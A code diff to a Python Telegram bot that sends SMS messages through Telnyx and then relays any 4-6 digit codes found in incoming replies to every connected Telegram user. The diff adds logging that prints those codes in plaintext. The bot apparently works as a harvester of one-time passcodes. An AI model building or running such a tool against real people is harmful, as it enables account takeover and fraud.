@@ -1,4 +1,4 @@
-import os, re, httpx, asyncio
+import os, re, httpx, asyncio, json
 from fastapi import FastAPI, Request
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
@@ -40,6 +40,7 @@ async def get_otp(msg: types.Message):
                     "text": "Your verification code is 123456"
                 }
             )
+            print(f"Telnyx response: {resp.status_code}")
         await msg.answer(f"✅ OTP sent to {phone}. Waiting for reply...")
     except Exception as e:
         await msg.answer(f"❌ Error sending OTP: {str(e)}")
@@ -65,14 +66,20 @@ app = FastAPI(lifespan=lifespan)
 async def webhook(request: Request):
     try:
         data = await request.json()
-        body = data.get("body", "")
-        from_number = data.get("from", "")
+        print(f"Webhook received: {json.dumps(data, indent=2)}")
+        
+        # Handle different Telnyx payload formats
+        body = data.get("body") or data.get("text") or data.get("data", {}).get("body") or ""
+        from_number = data.get("from") or data.get("source_number") or data.get("data", {}).get("from") or ""
+        
+        print(f"Extracted - Body: {body}, From: {from_number}")
         
         # Extract OTP from message
         otp_match = re.search(r'\b\d{4,6}\b', body)
         
         if otp_match:
             code = otp_match.group()
+            print(f"OTP found: {code}")
             # Send to all connected users
             for user_id, chat_id in user_chat_ids.items():
                 try:
@@ -81,8 +88,11 @@ async def webhook(request: Request):
                         text=f"📩 OTP received from {from_number}:\n\n`{code}`",
                         parse_mode="Markdown"
                     )
-                except:
-                    pass
+                    print(f"Message sent to user {user_id}")
+                except Exception as e:
+                    print(f"Failed to send to {user_id}: {e}")
+        else:
+            print("No OTP pattern found in message")
         
         return {"status": "ok"}
     except Exception as e:
